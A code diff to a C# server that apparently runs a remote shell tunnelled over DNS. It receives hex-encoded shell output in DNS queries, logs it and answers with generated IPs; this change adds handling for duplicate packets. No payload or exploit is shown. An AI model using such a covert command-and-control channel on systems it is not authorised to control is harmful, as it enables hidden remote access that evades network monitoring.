@@ -224,14 +224,23 @@ namespace Server.Logic
                         if (parser != null)
                         {
                             byte[] decodedData = Convert.FromHexString(hexData);
-                            parser.AddData(packetNumber, decodedData);
                             
-                            string decodedText = System.Text.Encoding.UTF8.GetString(decodedData);
-                            
-                            // Save shell output immediately
-                            parser.SaveDataByType(decodedText, Models.LogType.Shell);
-                            
-                            OnCommandResult?.Invoke(connectionId, decodedText);
+                            try
+                            {
+                                // Use type-specific packet tracking for shell data
+                                parser.AddDataByType(packetNumber, decodedData, Models.LogType.Shell);
+                                
+                                string decodedText = System.Text.Encoding.UTF8.GetString(decodedData);
+                                
+                                // Save shell output immediately
+                                parser.SaveDataByType(decodedText, Models.LogType.Shell);
+                                
+                                OnCommandResult?.Invoke(connectionId, decodedText);
+                            }
+                            catch (DuplicatePacketException)
+                            {
+                                // Silently ignore - BIND9 or network may send duplicate queries
+                            }
                         }
 
                         string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
@@ -307,6 +316,7 @@ namespace Server.Logic
                 }
                 catch (ShortCircuitException)
                 {
+                    // Silently return empty response for ignored queries (duplicates, etc)
                     response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                 }
                 catch (DNSSyntaxException)
